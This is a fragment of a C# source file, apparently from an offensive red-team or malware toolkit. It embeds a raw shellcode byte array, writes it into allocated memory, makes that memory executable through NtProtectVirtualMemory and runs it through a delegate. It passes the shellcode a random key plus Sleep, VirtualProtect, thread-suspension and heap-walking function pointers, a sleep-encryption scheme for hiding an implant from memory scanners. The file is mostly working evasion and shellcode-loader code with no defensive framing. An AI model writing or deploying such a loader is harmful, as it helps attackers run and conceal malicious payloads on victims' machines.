                      0x85, 0xc0, 0x0f, 0x85, 0x74, 0xff, 0xff, 0xff, 0xb8, 0x02, 0x00, 0x00,
                      0x00, 0xe9, 0xd1, 0xfc, 0xff, 0xff, 0x66, 0x2e, 0x0f, 0x1f, 0x84, 0x00,
                      0x00, 0x00, 0x00, 0x00, 0x83, 0xfa, 0x0c, 0x0f, 0x85, 0x87, 0xfc, 0xff,
                      0xff, 0xc7, 0x84, 0x8c, 0xd0, 0x01, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
                      0xe9, 0x77, 0xfc, 0xff, 0xff, 0x0f, 0x1f, 0x80, 0x00, 0x00, 0x00, 0x00,
                      0xc7, 0x84, 0x8c, 0xd0, 0x01, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0xe9,
                      0x60, 0xfc, 0xff, 0xff, 0xc7, 0x84, 0x8c, 0xd0, 0x01, 0x00, 0x00, 0x20,
                      0x00, 0x00, 0x00, 0xe9, 0x50, 0xfc, 0xff, 0xff, 0x31, 0xc0, 0xe9, 0x80,
                      0xfc, 0xff, 0xff, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00,
                      0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
                    };
                    //byte[] shellcode_bin = new byte[] { };
                    //string code = "{{REPLACE_CODE}}";
                    //string[] codeArray = code.Split(',');
                    //shellcode_bin = new byte[codeArray.Length];
                    //for (int i = 0; i < codeArray.Length; i++)
                    //{
                    //    shellcode_bin[i] = Convert.ToByte(codeArray[i], 16);
                    //}

                    uint shellcode_bin_len = 2384;

                    //get the base address of the current process
                    IntPtr pBaseAddress = Process.GetCurrentProcess().MainModule.BaseAddress;
                    //set the sleep time
                    uint dwSleepTime = (uint)sleeptime;
                    buffer = VirtualAlloc(IntPtr.Zero, (uint)shellcode_bin_len, h_reprobate.Win32.Kernel32.AllocationType.Commit | h_reprobate.Win32.Kernel32.AllocationType.Reserve, h_reprobate.Win32.Kernel32.MemoryProtection.ReadWrite);
                    //pin the buffer so it doesn't get moved by the GC
                    GCHandle pinnedBuffer = GCHandle.Alloc(buffer, GCHandleType.Pinned);
                    //copy in the shellcode 
                    Marshal.Copy(shellcode_bin, 0, buffer, (int)shellcode_bin_len);

                    //get IntPtr to kernel32.dll
                    IntPtr hKernel32 = GetModuleHandle("kernel32.dll");
                    //get IntPtr to VirtualProtect
                    hVirtualProtect = GetProcAddress(hKernel32, "VirtualProtect");

                    //get address of ntProtectVirtualMemory
                    IntPtr hNtdll = GetModuleHandle("ntdll.dll");
                    IntPtr hNtProtectVirtualMemory = GetProcAddress(hNtdll, "NtProtectVirtualMemory");

                    //NtProtectVirtualMemory 
                    IntPtr memoryLocation = buffer;
                    IntPtr memorySize = (IntPtr)shellcode_bin_len;
                    h_reprobate.NtProtectVirtualMemory((IntPtr)(-1), ref memoryLocation, ref memorySize, (uint)h_reprobate.Win32.Kernel32.MemoryProtection.ExecuteRead);
                    
                    //get IntPtr to Sleep
                    hSleep = GetProcAddress(hKernel32, "Sleep");

                    // get current process id
                    int pid = Process.GetCurrentProcess().Id;

                    //get current thread id
                    uint tid = GetCurrentThreadId();

                    //make a char array of a-z
                    char[] letter_keys = {'a','b','c','d','e', 'f', 'g', 'h', 'i', 'j', 'k' ,'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};
                    //pick a random char from the array
                    char random_char = letter_keys[new Random().Next(0, letter_keys.Length)];

                    //get array of the current process's threads ids
                    uint[] threadIds = Process.GetCurrentProcess().Threads.Cast<ProcessThread>().Select(t => (uint)t.Id).ToArray();
                    //remove current thread id from the array
                    threadIds = threadIds.Where(t => t != tid).ToArray();


                    //get intptr for OpenThread
                    hOpenThread = GetProcAddress(hKernel32, "OpenThread");
                    //get intptr for SuspendThread
                    hSuspendThread = GetProcAddress(hKernel32, "SuspendThread");
                    //get IntPtr for ResumeThread
                    hResumeThread = GetProcAddress(hKernel32, "ResumeThread");
                    //get intptr for CloseHandle
                    hCloseHandle = GetProcAddress(hKernel32, "CloseHandle");
                    //get intptr for HeapWalk
                    hHeapWalk = GetProcAddress(hKernel32, "HeapWalk");
                    //get intptr for GetProcessHeap
                    hGetProcessHeap = GetProcAddress(hKernel32, "GetProcessHeap");
                    //get intptr for  CreateToolhelp32Snapshot
                    hCreateToolhelp32Snapshot = GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
                    //get intptr for Thread32First
                    hThread32First = GetProcAddress(hKernel32, "Thread32First");
                    //get intptr for Thread32Next
                    hThread32Next = GetProcAddress(hKernel32, "Thread32Next");
                    //get intptr for HeapLock and HeapUnlock 
                    hHeapLock = GetProcAddress(hKernel32, "HeapLock");
                    
                    hHeapUnlock = GetProcAddress(hKernel32, "HeapUnlock");



                    PARAMS pARAMS = new PARAMS();
                    pARAMS.dwSleepTime = dwSleepTime;
                    pARAMS.pBaseAddress = pBaseAddress;
                    pARAMS.hSleep = hSleep;
                    pARAMS.hVirtualProtect = hVirtualProtect;
                    pARAMS.Key = random_char;
                    pARAMS.targetProcessId = (uint)pid;
                    pARAMS.targetThreadId = tid;
                    pARAMS.hOpenThread = hOpenThread;
                    pARAMS.hSuspendThread = hSuspendThread;
                    pARAMS.hResumeThread = hResumeThread;
                    pARAMS.hCloseHandle = hCloseHandle;
                    pARAMS.hHeapWalk = hHeapWalk;
                    pARAMS.hGetProcessHeap = hGetProcessHeap;
                    pARAMS.hCreateToolhelp32Snapshot = hCreateToolhelp32Snapshot;
                    pARAMS.hThread32First = hThread32First;
                    pARAMS.hThread32Next = hThread32Next;
                    pARAMS.hHeapLock = hHeapLock;
                    pARAMS.hHeapUnlock = hHeapUnlock;


                    //by making this I can pass the struct into my delegate and send any type of parameters such as arrays while before i could not when using a pointer to the struct directly.
                    int size = Marshal.SizeOf(pARAMS);
                    IntPtr arrPtr = Marshal.AllocHGlobal(size);
                    Marshal.StructureToPtr(pARAMS, arrPtr, false);
                    //Console.WriteLine($"sending random key of {random_char} to the shellcode");
                    SleepEncryptDelegate Run = (SleepEncryptDelegate)Marshal.GetDelegateForFunctionPointer(buffer, typeof(SleepEncryptDelegate));
                    int ReturnValue = Run(arrPtr);
                    //Console.WriteLine(ReturnValue);
                    Marshal.FreeHGlobal(arrPtr);
                }
            }
            catch (Exception e)
            {
                //Console.WriteLine(e.Message);
            }
        }  
    }
}
